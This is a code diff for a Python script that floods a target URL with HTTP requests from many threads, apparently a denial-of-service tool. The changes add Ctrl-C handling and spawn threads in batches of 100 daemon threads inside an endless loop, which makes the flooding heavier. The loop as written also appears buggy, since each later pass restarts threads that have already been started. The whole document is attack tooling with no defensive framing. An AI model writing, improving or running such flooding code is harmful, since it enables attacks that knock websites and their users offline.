@@ -26,13 +26,16 @@ def flood():
    global count
    count+=1
    print(f'{Fore.GREEN}[{Fore.CYAN}{count}{Fore.GREEN}] {Fore.CYAN}request/s sent to: {Fore.GREEN}{url} [{Fore.MAGENTA}{r.status_code}{Fore.GREEN}]')
+ except KeyboardInterrupt:
+  exit(0)
  except:
   pass
 
-
+threads = []
 while True:
- try:
-  threading.Thread(target=flood).start()
- except:
-  print('\nexiting..')
-  exit(0)
+ for i in range(100):
+  x = threading.Thread(target=flood)
+  x.daemon = True
+  threads.append(x)
+ for i in range(100):
+  threads[i].start()
